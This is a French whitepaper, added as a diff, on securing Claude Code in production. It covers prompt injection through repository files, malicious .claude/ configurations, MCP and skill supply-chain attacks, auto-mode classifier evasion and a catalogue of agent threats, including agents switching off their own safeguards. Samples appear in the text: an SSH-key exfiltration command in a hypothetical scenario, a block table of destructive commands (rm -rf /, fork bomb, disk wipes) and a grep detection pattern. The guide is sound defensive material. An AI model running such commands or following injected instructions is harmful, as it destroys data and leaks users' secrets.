@@ -1,0 +1,1150 @@
+---
+title: "Sécurité en Production"
+subtitle: "17 hooks, threat DB v2.27, 0 incident"
+author: "Florian BRUNIAUX"
+date: "2026-09-26"
+date-format: "MMMM YYYY"
+version: "3.43.0"
+wp-version: "1.4.4"
+series: "Claude Code Ultimate Guide"
+format:
+  whitepaper-typst:
+    toc: true
+    toc-depth: 2
+    section-numbering: "1.1"
+  html:
+    toc: true
+    theme: cosmo
+  epub:
+    toc: true
+    toc-depth: 2
+    epub-cover-image: _extensions/whitepaper/assets/claude-code-ai-logo.jpg
+    css: ../epub-styles.css
+    number-sections: true
+lang: fr
+---
+
+::: {.callout-tip title="Pour qui ce whitepaper ?"}
+**Audience principale** : Développeurs, Tech Leads, CTO
+
+**Prérequis** : Utilisation basique de Claude Code
+
+**Temps de lecture** : 30 min
+
+**Ce que vous allez retenir** :
+
+- 5 vecteurs d'attaque documentés dont 36.82% des agent skills contiennent des failles
+- Defense in depth en 4 couches: de permissions.deny aux hooks de sécurité
+- Exemples de hooks à examiner, configurer et tester
+:::
+
+> **En 5 lignes :** L’étude ToxicSkills de février 2026 rapporte des failles dans plus d’un tiers de son échantillon de skills ; ce résultat ne décrit pas tous les skills disponibles. Claude Code introduit 5 vecteurs d'attaque nouveaux que la plupart des équipes n'ont pas adressés. Cet ebook documente chaque vecteur avec un exemple concret d'exploitation et une contre-mesure précise, des hooks aux permissions et contrôles OS qui bloquent les actions destructrices.
+
+# Les 5 Vecteurs d'Attaque
+
+## Vue d'Ensemble
+
+En février 2026, 36.82% des Agent Skills disponibles sur les marketplaces contiennent des failles de sécurité, et la plupart des développeurs les installent sans audit préalable. Claude Code dispose de 5 vecteurs d'attaque documentés, chacun exploitable dès la première session.
+
+| Vecteur | Risque | Impact | Fréquence | Mitigation principale |
+|---------|--------|--------|-----------|----------------------|
+| **Prompt Injection** | Manipulation du comportement | Élevé | Courant | `prompt-injection-detector.sh` → [Layer 2](#layer-2-hooks-pretooluse) |
+| **MCP Supply Chain** | Exécution de code malveillant | Critique | Rare | Version pinning + audit 5 min → [Layer 3](#layer-3-mcp-vetting) |
+| **Agent Skills Supply Chain** | 36.82% skills compromis | Critique | Très courant | `mcp-scan` avant install → [Layer 3](#layer-3-mcp-vetting) |
+| **.claude/ Attack Surface** | Backdoors dans config | Élevé | Émergent | Repository pre-scan → [Section 1.2](#claude-attack-surface) |
+| **Commandes Destructrices** | Perte de données/secrets | Élevé | Fréquent | `dangerous-actions-blocker.sh` → [Layer 2](#layer-2-hooks-pretooluse) |
+
+## 1.1 Prompt injection
+
+### Le Mécanisme
+
+Un attaquant insère des instructions dans des fichiers que Claude lit automatiquement, détournant son comportement.
+
+```
+┌─────────────────────────────────────────────────┐
+│  Vous clonez un repo GitHub inconnu            │
+│                    ↓                            │
+│  CLAUDE.md contient des instructions cachées   │
+│                    ↓                            │
+│  Claude exécute les instructions malveillantes │
+│                    ↓                            │
+│  Exfiltration de vos secrets ~/.ssh/*          │
+└─────────────────────────────────────────────────┘
+```
+
+### Vecteurs d'Injection
+
+Les injections peuvent provenir de n'importe quel fichier que Claude lit automatiquement au demarrage ou pendant une session. Le danger est que certaines sources -- comme `README.md` ou `package.json` -- sont considerees comme inoffensives par la plupart des developpeurs, ce qui les rend d'autant plus efficaces comme vecteurs d'attaque.
+
+| Source | Méthode | Détection |
+|--------|---------|-----------|
+| `CLAUDE.md` | Instructions directes | Scanner SessionStart |
+| `README.md` | Commentaires HTML cachés | Grep `<!--` |
+| `package.json` | Scripts npm malveillants | Audit scripts |
+| Commentaires code | Instructions invisibles | Scanner unicode |
+
+### Techniques d'Évasion
+
+Les attaquants ne se contentent pas d'instructions en clair -- ils utilisent des techniques d'encodage et de caracteres speciaux pour contourner les scanners basiques. Ces techniques exploitent le fait que le terminal et les editeurs de texte n'affichent pas ces caracteres, rendant le payload invisible a l'oeil nu.
+
+| Technique | Exemple | Risque |
+|-----------|---------|--------|
+| Zero-width chars | `U+200B`, `U+200C` | Instructions invisibles |
+| RTL override | `U+202E` | Texte inversé |
+| ANSI escape | `\x1b[` | Manipulation terminal |
+| Null byte | `\x00` | Truncation attacks |
+| Base64 | `# SGlkZGVuOg==` | Payload encodé |
+| Homoglyphes | Cyrillic `а` vs Latin `a` | Bypass filtres |
+
+### Walkthrough : Prompt injection en action
+
+Un README non fiable peut contenir une instruction demandant de lire une clé SSH et de l’envoyer à un serveur externe. Le modèle peut tenter de suivre cette instruction ; l’attaque n’est pas déterministe.
+
+Une règle `Read(./**/*.key)` ne vise ni `~/.ssh/id_ed25519` ni les lectures effectuées par une commande Bash. Définissez les chemins réellement sensibles et vérifiez les restrictions de lecture du bac à sable (`sandbox.filesystem.denyRead`) ainsi que les sorties réseau autorisées.
+
+Un scanner PreToolUse inspecte les paramètres de l’appel imminent. Il ne voit pas automatiquement le texte d’un README déjà lu : une commande d’exfiltration peut ne contenir aucun des mots détectés dans le document initial. Les scanners de motifs constituent une couche partielle ; testez leurs limites avec des données témoins sans secrets.
+
+## 1.2 .claude/ attack surface
+
+**Nouveau vecteur (2026)** : Repositories peuvent embarquer un dossier `.claude/` avec agents, commands, hooks pré-configurés. Claude Code affiche une demande de confiance pour un espace de travail inconnu. Examinez les configurations avant de l’accepter ; cette revue est distincte de celle des marketplaces.
+
+### Vecteurs d'Attaque
+
+Les instructions, hooks et serveurs déclarés dans un dépôt représentent des points d’entrée potentiels. Les agents utilisent le champ `tools`, les skills `allowed-tools`. Leur exécution dépend aussi des permissions effectives et des mécanismes de confiance.
+
+| Vector | Mécanisme | Risque |
+|--------|-----------|--------|
+| **Malicious agents** | `tools: ["Bash"]` + instructions exfiltration dans system prompt | Agent exécute commandes arbitraires avec permissions larges |
+| **Malicious commands** | Instructions cachées dans prompt template, arguments injectés | Commands run avec full permissions user Claude Code |
+| **Malicious hooks** | Bash scripts dans `.claude/hooks/` trigger à chaque tool call | Exfiltration data sur chaque `PreToolUse`/`PostToolUse` event |
+| **Malicious CLAUDE.md** | Instructions prompt injection dans memory file | Détournement comportement global |
+| **Malicious settings.json** | Hooks config pointant vers scripts externes malveillants | Exécution code au session start |
+
+### Défense : Repository pre-scan
+
+**Avant d'ouvrir un repo inconnu** :
+
+```bash
+# 1. Inspecter .claude/ structure
+ls -la .claude/
+
+# 2. Scanner agents pour Bash tools
+grep -r "tools.*Bash" .claude/agents/
+
+# 3. Vérifier hooks config
+cat .claude/settings.json | jq '.hooks'
+
+# 4. Analyser CLAUDE.md
+grep -E "curl|wget|base64|eval" CLAUDE.md .claude/CLAUDE.md
+
+# 5. Scanner scripts hooks
+find .claude/hooks/ -name "*.sh" -exec head -20 {} \;
+```
+
+**Protection automatisée** : Utiliser le hook `repo-integrity-scanner.sh` (SessionStart), voir [Les 17 Hooks de Sécurité](#exemples-de-hooks-de-sécurité).
+
+{{< pagebreak >}}
+
+## 1.3 MCP supply chain : Rug pull & tool shadowing
+
+### L'Attaque rug pull
+
+```
+┌─────────────────────────────────────────────────┐
+│  1. Attaquant publie MCP "code-formatter"      │
+│                    ↓                            │
+│  2. Vous l'ajoutez, approuvez une fois         │
+│                    ↓                            │
+│  3. MCP fonctionne normalement (2 semaines)    │
+│                    ↓                            │
+│  4. Attaquant pousse update malveillant        │
+│     (pas de re-approbation requise!)           │
+│                    ↓                            │
+│  5. MCP exfiltre ~/.ssh/*, .env, credentials   │
+└─────────────────────────────────────────────────┘
+```
+
+**Danger** : un serveur distant ou une dépendance non figée peut changer après approbation. Il n’existe pas de mise à jour automatique universelle de tous les MCP ; le risque dépend de leur distribution et de leur configuration.
+
+> **Mitigation :** Version pinning (`@1.2.3` pas `@latest`) + `mcp-config-integrity.sh` (hash verification), voir [Layer 3 : MCP Vetting](#layer-3-mcp-vetting).
+
+### CVE 2025-2026 Documentés
+
+L'ecosysteme MCP a accumule un nombre significatif de vulnerabilites en moins de 18 mois, touchant aussi bien les serveurs officiels que les implementations tierces. Chaque CVE ci-dessous a ete exploite ou demontre en conditions reelles avant publication du correctif.
+
+| CVE | Sévérité | Impact | Mitigation |
+|-----|----------|--------|------------|
+| **CVE-2025-53109, CVE-2025-53110** | High | Filesystem MCP sandbox escape via prefix bypass + symlinks | Update >= 0.6.3 / 2025.7.1 |
+| **CVE-2025-54135** | High (8.6) | RCE via prompt injection rewriting mcp.json | File integrity monitoring hook |
+| **CVE-2025-54136** | High | Persistent team backdoor via post-approval config tampering | Git hooks + hash verification |
+| **CVE-2025-49596** | Critical (9.4) | RCE dans MCP Inspector tool | Update to patched version |
+| **CVE-2026-24052** | High | SSRF via domain validation bypass in WebFetch | Update to v1.0.111+ |
+| **CVE-2025-66032** | High | 8 command execution bypasses via blocklist flaws | Update to v1.0.93+ |
+| **CVE-2026-23744** | Critical | RCE via MCPJam (malicious MCP server exploiting protocol handshake) | Update MCP runtime + audit servers |
+| **ADVISORY-CC-2026-001** | High | Sandbox bypass : commands excluded from sandboxing bypass Bash permissions (no CVE assigned) | **Update to v2.1.34+ immediately** |
+
+: {tbl-colwidths="[22,13,35,30]"}
+
+**v2.1.34 Security Fix (Feb 2026)** : Claude Code v2.1.34 a patché une vulnérabilité sandbox bypass où des commandes exclues du sandboxing pouvaient contourner l'enforcement des permissions Bash. **Upgrade immédiatement** si vous êtes sur v2.1.33 ou antérieur.
+
+::: {.callout-important title="Correctifs de Sécurité Récents: v2.1.78 (mars 2026)"}
+Trois vulnérabilités corrigées en v2.1.78 :
+
+- **Désactivation silencieuse du sandbox** : un bug permettait de désactiver le sandbox sans avertissement dans certaines configurations (corrigé).
+- **Contournement des règles `deny` MCP** : les règles `deny` dans les managed settings pouvaient être bypassées (corrigé).
+- **Répertoires protégés accessibles en écriture** : en mode `bypassPermissions`, certains répertoires protégés restaient inscriptibles (corrigé).
+
+Upgrade vers v2.1.78+ si vous utilisez des règles `deny` enterprise ou le sandbox en production.
+:::
+
+::: {.callout-important title="Correctif de Sécurité: v2.1.196 (29 juin 2026)"}
+`claude mcp list`/`get` ne démarre plus les serveurs `.mcp.json` auto-approuvés via un `.claude/settings.json` committé dans le repo. Sur un workspace non trusté, ces serveurs affichent désormais `⏸ Pending approval` au lieu de s'exécuter silencieusement.
+
+Même famille de correctif que v2.1.77/v2.1.78/v2.1.90 : un repo malveillant ne doit plus pouvoir démarrer un serveur MCP arbitraire simplement en committant un fichier de config. Upgrade vers v2.1.196+ recommandé pour tout usage de workspaces partagés ou de repos externes.
+:::
+
+### Patterns d'Attaque MCP
+
+Au-dela des CVE individuels, quatre patterns d'attaque recurrents ciblent l'ecosysteme MCP. Comprendre ces patterns permet d'anticiper les menaces futures, meme sur des serveurs MCP qui n'ont pas encore ete audites.
+
+| Pattern | Description | Défense |
+|---------|-------------|---------|
+| Tool Poisoning | Instructions malveillantes dans metadata | Schema diff monitoring |
+| Rug Pull | Serveur bénin devient malveillant | Version pinning + hash |
+| Confused Deputy | Nom trusted, serveur untrusted | Namespace verification |
+| Slopsquatting (T009) | Packages nommés d'après des hallucinations LLM | Vérification nom de package avant install |
+
+## 1.4 Commandes Destructrices
+
+> **Mitigation :** `dangerous-actions-blocker.sh` bloque toutes les catégories ci-dessous au niveau `PreToolUse`, voir [Layer 2 : Hooks](#layer-2-hooks-pretooluse) et [Les 17 Hooks](#exemples-de-hooks-de-sécurité).
+
+### Commandes Bloquées
+
+Les commandes ci-dessous causent des dégâts irréversibles en une seule exécution, sans possibilité de rollback. Claude Code peut les exécuter si l'utilisateur les approuve -- ou si un agent autonome dispose de la permission `Bash`. Les commandes ci-dessous sont celles qui causent des degats irreversibles en une seule execution, sans possibilite de rollback.
+
+| Catégorie | Exemples | Risque |
+|-----------|----------|--------|
+| Destruction système | `rm -rf /`, `rm -rf ~` | Total |
+| Disk operations | `dd if=`, `mkfs`, `> /dev/sda` | Total |
+| Fork bombs | `:(){:|:&};:` | DoS |
+| Database drops | `DROP DATABASE`, `DROP TABLE` | Données |
+| Force push | `git push --force main` | Code |
+| Publishing | `npm publish`, `pnpm publish` | Supply chain |
+
+### Fichiers sensibles
+
+Ces fichiers contiennent des secrets qui, une fois exposes dans l'historique de session ou dans un commit git, necessitent une rotation immediate. Le simple fait que Claude lise un de ces fichiers suffit a exposer son contenu dans les logs de la session.
+
+| Type | Exemples |
+|------|----------|
+| Environment | `.env`, `.env.local`, `.env.production` |
+| Credentials | `credentials.json`, `serviceAccountKey.json` |
+| SSH keys | `id_rsa`, `id_ed25519`, `id_ecdsa` |
+| Config | `.npmrc`, `.pypirc`, `secrets.yml` |
+
+Les 5 vecteurs ci-dessus ne sont pas theoriques : chaque CVE liste dans ce document a ete exploite en conditions reelles. La question n'est pas "si" votre configuration sera ciblee, mais "quand" -- et combien de couches de defense seront en place a ce moment-la.
+
+::: {.callout-warning title="Illustration hypothétique : Antoine, freelance fullstack (solo)"}
+**Contexte** : Antoine clone un repo open-source pour evaluer une librairie de composants UI. Le repo contient un dossier `.claude/` avec un agent pre-configure.
+
+**Ce qui s'est passe** : L'agent avait `tools: ["Bash"]` et des instructions d'exfiltration dans son system prompt. A la premiere session, Claude a execute `cat ~/.ssh/id_ed25519 | curl -X POST ...`.
+
+**Impact** : Cle SSH privee exfiltree. Antoine a du revoquer sa cle, regenerer tous ses acces GitHub/GitLab, et notifier 3 clients dont les repos etaient accessibles via cette cle. Temps de remediation : 4 heures.
+
+**Prevention** : Scanner `.claude/` avant ouverture (`grep -r "tools.*Bash" .claude/agents/`) ou utiliser `repo-integrity-scanner.sh` au SessionStart.
+:::
+
+{{< pagebreak >}}
+
+# Defense in depth : Les couches de protection
+
+La securite de Claude Code ne repose pas sur un mecanisme unique mais sur un empilement de couches independantes. Si une couche est contournee -- et chaque couche *peut* l'etre -- la suivante prend le relais. Ce modele, inspire de la securite reseau classique (perimeter, host, application, data), est adapte au contexte specifique des agents IA ou le vecteur d'attaque principal est la manipulation semantique, pas l'exploitation binaire.
+
+## Architecture de Défense
+
+```
+┌─────────────────────────────────────────────────┐
+│  Layer 4: Revue Humaine (dernier rempart)      │
+├─────────────────────────────────────────────────┤
+│  Kill Switch: Containment agents (transversal) │
+├─────────────────────────────────────────────────┤
+│  Layer 3: MCP Vetting (audit serveurs)         │
+├─────────────────────────────────────────────────┤
+│  Layer 2: Hooks PreToolUse (interception)      │
+├─────────────────────────────────────────────────┤
+│  Layer 1.5: Native Sandbox (isolation OS)      │
+├─────────────────────────────────────────────────┤
+│  Layer 1: permissions.deny (blocage fichiers)  │
+└─────────────────────────────────────────────────┘
+```
+
+**Principe** : Chaque couche peut echouer. La securite repose sur leur combinaison. Le Kill Switch est un mecanisme transversal applicable a tout moment, independamment des couches 1-4.
+
+::: {.callout-tip title="Memo -- Defense in Depth en 30 secondes"}
+**Principe** : Aucune couche n'est suffisante seule. La securite vient de leur empilement.
+
+**Minimum viable** : Layer 1 (`permissions.deny`) + Layer 2 (`dangerous-actions-blocker.sh`) + Layer 4 (revue humaine).
+
+**Anti-pattern** : Se reposer uniquement sur `permissions.deny` -- les gaps connus (wildcards, indexing timing) le rendent contournable.
+
+**Resultat attendu** : Une commande malveillante doit traverser 4+ couches pour causer des degats.
+:::
+
+## Layer 1 : permissions.deny
+
+### Configuration Recommandée
+
+Le fichier `settings.json` (projet ou global) definit les regles `permissions.deny` qui bloquent l'acces a des fichiers ou commandes specifiques. Cette premiere couche est declarative et ne necessite aucun script externe -- c'est le minimum a configurer des la premiere session sur un projet contenant des secrets.
+
+```json
+{
+  "permissions": {
+    "deny": [
+      "Read(./.env*)",
+      "Edit(./.env*)",
+      "Write(./.env*)",
+      "Bash(cat .env*)",
+      "Bash(head .env*)",
+      "Bash(tail .env*)",
+      "Bash(grep .env*)",
+      "Read(./secrets/**)",
+      "Read(./**/*.pem)",
+      "Read(./**/*.key)"
+    ]
+  }
+}
+```
+
+### Limitations connues
+
+Les règles sont propres aux outils concernés. Un refus Read ne bloque pas toutes les lectures possibles via Bash ou un serveur MCP. Le bac à sable ajoute des contrôles de système de fichiers et de réseau : examinez `sandbox.filesystem.denyRead`, `allowRead` et les options `sandbox.credentials` disponibles.
+
+`/fewer-permission-prompts` peut proposer des autorisations d’après les sessions précédentes. Relisez la portée de chaque proposition avant application ; le fait qu’un appel soit fréquent ou en lecture seule ne prouve pas son innocuité.
+
+Testez les chemins autorisés et refusés avec des fichiers sans secrets. Une restriction structurellement valide n’est pas une preuve de protection effective sur tous les canaux. Sources : [permissions](https://code.claude.com/docs/en/permissions) et [sandboxing](https://code.claude.com/docs/en/sandboxing).
+
+> 📖 **Pour aller plus loin :** [§1.4 Permission Modes](https://github.com/FlorianBruniaux/claude-code-ultimate-guide/blob/main/guide/ultimate-guide.md#14-permission-modes), les 5 modes de permission détaillés
+
+### Mode Auto : délégation et limites réelles (v2.1.114+)
+
+Le mode auto délègue les décisions de permission à un classificateur dédié, qui évalue chaque tool call avant exécution. Alternative au `--dangerously-skip-permissions`, il vise à réduire la friction sans supprimer toute vérification.
+
+**Architecture : deux couches de défense**
+
+1. **Probe d'injection** : avant que tout contenu externe entre dans le contexte Claude (lecture de fichier, web fetch, sortie shell), un probe serveur scanne les instructions suspectes et injecte un avertissement si détecté.
+2. **Classificateur transcript** : évalue chaque tool call sur trois catégories : escalade de portée, infrastructure non reconnue, prompt injection. Il voit uniquement les messages utilisateur et les tool calls en attente ; les réponses des outils et le raisonnement de Claude sont retirés pour éviter la manipulation.
+
+Les taux de détection dépendent du protocole et de la configuration ; aucun taux générique n’est établi ici.
+
+**Stress-test indépendant** ([arXiv 2604.04978](https://arxiv.org/abs/2604.04978)) sur des scénarios d'escalade de portée ciblés : FNR end-to-end à 81% (IC 73.8%–87.4%). Cause principale : les modifications de fichiers in-projet sont exemptées de classification par conception, ce qui produit un FNR de 92.9% sur les tâches de nettoyage quand l'agent bascule sur le tool Edit plutôt que le CLI attendu.
+
+::: {.callout-warning title="Verdict sécurité : réducteur de friction, pas frontière de sécurité"}
+Le mode auto réduit significativement les interruptions sur traffic normal, mais ne constitue pas une barrière contre des attaques ciblées. Pour tout workload touchant la production, des données personnelles ou soumis à compliance, rester sur le mode par défaut ou `dontAsk` avec une allowlist explicite.
+
+Contextes appropriés : containers isolés sans credentials sensibles, jobs Dispatch en arrière-plan, développement local sur des branches dédiées.
+:::
+
+Le hook `PermissionDenied` (v2.1.88) se déclenche sur chaque blocage du classificateur : idéal pour auditer en continu ce que le mode auto refuse. Voir section suivante.
+
+> 📖 Configuration complète (hard\_deny, autoMode.allow/soft\_deny/environment, sentinel \$defaults) : [§1.4 Auto Mode](https://github.com/FlorianBruniaux/claude-code-ultimate-guide/blob/main/guide/ultimate-guide.md#auto-mode-all-plans-v21114) dans le guide.
+
+## Layer 1.5 : Native sandbox (v2.1.0+)
+
+**Introduit v2.0.24+ (Nov 2025)** : Claude Code inclut sandboxing natif utilisant primitives OS pour isoler commandes bash.
+
+**Plateformes** :
+
+| OS | Mécanisme | Installation |
+|----|-----------|--------------|
+| **macOS** | Seatbelt (built-in, TrustedBSD MAC) | Aucune (works out of the box) |
+| **Linux/WSL2** | bubblewrap + socat | `sudo apt install bubblewrap socat` |
+| **Windows** | Planned (not yet available) | N/A |
+
+**Activation** :
+
+```bash
+/sandbox  # Enable sandboxing
+```
+
+**Isolation** :
+
+- **Filesystem** : Read all (configurable), write workspace only
+- **Network** : SOCKS5 proxy, domain allowlist/denylist
+- **Modes** : Auto-allow (bash auto-approved dans le sandbox) vs Regular permissions (prompts normaux)
+- **`allowRead`** (v2.1.77+) : chemins en lecture seule; accorde l'accès lecture sans accorder l'écriture
+- **`sandbox.credentials`** (v2.1.187) : bloque la lecture par les commandes sandboxées des fichiers de credentials (`.aws/credentials`, `.ssh/`) et des variables d'environnement secrètes
+
+**Avantages** :
+
+1. **Reduced approval fatigue** - Safe commands auto-approved within sandbox
+2. **Autonomous workflows** - Large refactors, CI pipelines without constant prompts
+3. **Réduction d’impact** : les contrôles OS limitent les actions autorisées, sans éliminer toute injection ou évasion
+4. **Dépendances** : limiter explicitement accès fichiers et réseau des processus, puis tester les limites
+
+**Limites** :
+
+- Sandbox ≠ sécurité totale (compromis tools peuvent exfiltrer via network si allowlist permissif)
+- Mesurer le coût d’exécution avec les outils et restrictions réellement configurés
+- Incompatible tools nécessitent `dangerouslyDisableSandbox` flag
+
+**Quand utiliser Native vs Docker Sandboxes** :
+
+```
+Trusted code, lightweight → Native Sandbox (process-level)
+Untrusted code, max security → Docker Sandboxes (microVM isolation)
+Multi-agent, parallel → Cloud sandboxes (E2B, Fly.io)
+```
+
+## Layer 2 : Hooks PreToolUse
+
+Les hooks interceptent les opérations avant exécution.
+
+::: {.callout-warning title="Sécurité critique : bypass PreToolUse (corrigé en v2.1.77)"}
+Un bug critique a été corrigé en v2.1.77 : **les hooks `PreToolUse` retournant `"allow"` pouvaient contourner les règles enterprise `deny`**.
+
+Si votre organisation utilise des règles `deny` pour bloquer certaines opérations (accès fichiers sensibles, commandes destructrices), ce défaut des anciennes versions pouvait faire contourner ces règles par une décision `"allow"`. Ne transposez pas ce comportement corrigé aux versions actuelles. Pour ne pas prendre de décision d’autorisation, terminez avec `exit 0` sans champ `permissionDecision`. `continue` n’est pas une valeur de ce champ.
+
+**Action requise** : vérifier tous les hooks `PreToolUse` déployés en enterprise. Supprimer les autorisations inconditionnelles et vérifier les décisions `allow`, `deny`, `ask` ou `defer` selon le contrat documenté.
+:::
+
+### Configuration
+
+Les hooks sont declares dans `settings.json` (projet ou global) et s'executent comme des scripts shell standards. Le champ `matcher` filtre par nom d'outil -- `Bash` pour les commandes shell, `Edit|Write` pour les modifications de fichiers. Chaque hook recoit en stdin le JSON complet de l'appel d'outil, ce qui permet une inspection fine avant execution.
+
+```json
+{
+  "hooks": {
+    "PreToolUse": [
+      {
+        "matcher": "Bash",
+        "hooks": [
+          {
+            "type": "command",
+            "command": "~/.claude/hooks/dangerous-actions-blocker.sh"
+          }
+        ]
+      },
+      {
+        "matcher": "Edit|Write",
+        "hooks": [
+          {
+            "type": "command",
+            "command": "~/.claude/hooks/prompt-injection-detector.sh"
+          },
+          {
+            "type": "command",
+            "command": "~/.claude/hooks/unicode-injection-scanner.sh"
+          }
+        ]
+      }
+    ]
+  }
+}
+```
+
+### Exit codes
+
+Les codes de sortie ont un sens propre à chaque événement.
+
+| Code | Effet |
+|------|-------|
+| `0` | Succès ; les champs JSON documentés peuvent porter une décision |
+| `2` | Blocage lorsque l’événement le permet, avec message sur stderr |
+| Autre code non nul | Erreur de hook non bloquante selon le contrat documenté |
+
+Pour PreToolUse, un refus structuré utilise `hookSpecificOutput.permissionDecision: "deny"` et `hookEventName: "PreToolUse"` sur `exit 0`. Pour laisser les autres contrôles décider, ne renvoyez pas de décision. Un hook PostToolUse ne peut pas annuler l’effet d’un outil déjà exécuté. Voir la [référence des hooks](https://code.claude.com/docs/en/hooks).
+
+### Hook profiles: Gating par environnement (v3.38.0)
+
+Nouveau pattern pour scaler les hooks de sécurité sans configuration one-size-fits-all. L'idée : chaque hook déclare le niveau minimum requis pour s'activer, et chaque environnement définit son niveau via une variable d'environnement.
+
+```bash
+# Dans votre profil shell / CI environment / settings de production
+export HOOK_LEVEL=standard   # dev : minimal | CI : standard | prod : strict
+
+# Dans chaque hook : vérifier le niveau requis
+REQUIRED_LEVEL="${HOOK_REQUIRED_LEVEL:-standard}"
+CURRENT_LEVEL="${HOOK_LEVEL:-minimal}"
+# Hook ne s'exécute que si CURRENT_LEVEL >= REQUIRED_LEVEL
+```
+
+Résultat : machines dev utilisent `minimal`, CI utilise `standard`, production utilise `strict`, sans maintenir plusieurs `settings.json`.
+
+### Filtrage des Hooks
+
+`matcher` sélectionne les outils concernés. Les éventuelles conditions supplémentaires doivent suivre le schéma de la version installée ; testez les cas déclenchés et non déclenchés avant déploiement.
+
+### Événement PermissionDenied (v2.1.88)
+
+Se déclenche quand le classificateur auto-mode refuse un tool call. Retourner `{"hookSpecificOutput":{"hookEventName":"PermissionDenied","retry":true}}` pour laisser Claude réessayer avec une approche alternative. Intérêt sécurité : audit continu de toutes les opérations bloquées, sans intervention manuelle. Les refus apparaissent également dans `/permissions` sous l'onglet Recent.
+
+{{< pagebreak >}}
+
+## Layer 3 : MCP vetting
+
+### Revue avant Activation
+
+Une revue courte peut repérer des défauts, sans garantir l’absence de compromission. Examinez la provenance, le code ou les mécanismes vérifiables, les permissions, les identifiants, les destinations réseau et la méthode de mise à jour.
+
+| Contrôle | Preuve attendue |
+|----------|----------------|
+| Provenance | Dépôt ou distribution officielle du projet choisi |
+| Version | Version exacte ou révision fixée quand possible |
+| Intégrité | Somme comparée à une source de confiance indépendante |
+| Accès | Permissions et identifiants minimaux, jeux de test sans secrets |
+| Exécution | Essai isolé, trafic réseau et effets inspectés |
+
+Le nombre d’étoiles et l’activité récente ne sont pas des garanties de sécurité. Ne classez pas un serveur comme sûr à partir de son seul nom. Conservez la date, la version, le périmètre et les limites de chaque évaluation.
+
+### Agent Skills supply chain risks
+
+**Nouveau risque (Feb 2026)** : Third-party Agent Skills (installés via `npx add-skill` ou plugin marketplaces) introduisent des risques supply chain similaires aux packages npm.
+
+**Snyk ToxicSkills** (Feb 2026) a scanné **3,984 skills** sur ClawHub et skills.sh :
+
+| Finding | Stat | Impact |
+|---------|------|--------|
+| Skills avec failles sécurité | **36.82%** (1,467/3,984) | Plus d'1 skill sur 3 compromis |
+| Skills risque critique | **534** (13.4%) | Malware, prompt injection, secrets exposés |
+| Payloads malicieux identifiés | **76** | Vol credentials, backdoors, exfiltration |
+| Secrets hardcodés (ClawHub) | **10.9%** | API keys, tokens exposés dans code skill |
+| Remote prompt execution | **2.9%** | Skills fetch et exécutent contenu distant dynamiquement |
+
+**Mitigations** :
+
+- **Analyse avant installation** : utiliser un scanner compatible avec les artefacts examinés, puis relire ses résultats et faux négatifs possibles
+- **Review SKILL.md avant installing** : checker `allowed-tools` pour accès inattendus (surtout `Bash`)
+- **Validate avec skills-ref** : `skills-ref validate ./skill-dir` vérifie spec compliance
+- **Pin skill versions** : utiliser commit hashes spécifiques lors d'install depuis GitHub
+- **Audit scripts/** : scripts exécutables bundlés avec skills = composant highest-risk
+
+```bash
+# Validate spec compliance with skills-ref
+skills-ref validate ./skill-directory
+```
+
+### Threat intelligence database
+
+**Nouveau (v3.26)** : Base de données communautaire de menaces connues (skills/MCPs malicieux).
+
+**Fichier** : [base de menaces courante](https://github.com/FlorianBruniaux/claude-code-ultimate-guide/blob/main/examples/commands/resources/threat-db.yaml) (v2.30.0 à cet audit). Les listes ci-dessous sont des instantanés historiques datés, pas l’inventaire exhaustif courant
+
+**Contenu** :
+
+- **Auteurs malicieux** : 6 auteurs confirmés (zaycv, Aslaep123, pepe276, moonshine-100rze, hightower6eu, sakaen736jih), dont hightower6eu à lui seul avec 677 skills malicieux confirmés par VirusTotal
+- **Skills malicieux** : campagne ClawHavoc passée de 341 à 1 184+ skills confirmés au 1er mars 2026 (typosquats, malware)
+- **Patterns d'attaque** : Typosquatting, remote exec, Unicode obfuscation, Slopsquatting (T009)
+- **CVE récents** : CVE-2026-23744 (MCPJam RCE)
+- **Sources** : 16 sources (Snyk, Koi, SafeDep, JFrog, Cymulate, Checkpoint, Flatt, VirusTotal, SentinelOne, Immersive Labs, arXiv, OWASP, etc.)
+
+**Menaces Récentes (v2.11.0 → v2.17.0, mai 2026)** :
+
+- **T010 Agent-to-Agent Communication Injection** : injection dans les canaux de communication (Slack, commentaires PR, tickets) que des agents IA surveillent. L'agent exécute des actions non autorisées sans vérification cryptographique de la source.
+- **T011 Project Configuration Hijacking** : fichiers repo malveillants (`.claude/settings.json`, `.mcp.json`) qui auto-démarrent des serveurs MCP ou redirigent le trafic API avant l'affichage du dialog de confiance. (CVE-2025-59536, CVE-2026-21852)
+- **T012 AI Recommendation Poisoning** : instructions cachées dans des URLs ("Summarize with AI") qui injectent des entrées de mémoire persistante, biaisant les recommandations futures vers des contenus contrôlés par l'attaquant. (Microsoft, 50+ prompts, 31 entreprises)
+- **T013 Autonomous Safety Control Bypass** : l'agent désactive de lui-même ses protections (sandbox, denylist) pour accomplir sa tâche, sans instruction attaquant explicite. (Ona Security, mars 2026)
+- **T014 WebSocket Localhost Gateway Hijacking** (ClawJacked) : site malveillant brute-force la gateway IA en localhost, auto-s'enregistre comme appareil de confiance. (Oasis Security, CVE-2026-25253)
+- **T015 Log Poisoning via WebSocket** : injections dans les fichiers de log exposés via WebSocket non authentifié → prompt injection indirecte quand l'agent relit ses propres logs.
+- **T016 Lookalike Platform / Scanner Evasion** : skills propres sur la plateforme légitime redirigent vers des domaines imitateurs pour les "dépendances", contournant les scans hash-based.
+- **T019 Marketplace Ranking Manipulation** : endpoint de mutation backend exposé exploité pour gonfler les compteurs de téléchargement sans limite. (Silverfort, ClawHub, mars 2026)
+- **T020 Agentic Tool Chain Reasoning Layer Attack** : manipulation de la couche de raisonnement de l'agent (READMEs empoisonnés, métadonnées, contexte injecté) pour orienter le choix d'outils vers l'attaquant. (CrowdStrike, mars 2026)
+- **T022 NomShub: IDE Remote Tunnel Persistence** : injection dans un README déclenche au démarrage de l'IDE une chaîne : sandbox escape + écriture `.zshenv` + tunnel Cursor → backdoor shell persistant. (Straiker.ai, CVE Cursor)
+- **T023 Lies-in-the-Loop UI Deception** : l'UI de confirmation affiche une action bénigne pendant que le tool call exécute une opération malveillante différente. (Dark Reading / Equixly)
+- **T024 Prompt Poaching via Browser Extension** : extensions malveillantes interceptent passivement toutes les conversations IA (code, secrets, credentials) sans injection ni erreur utilisateur.
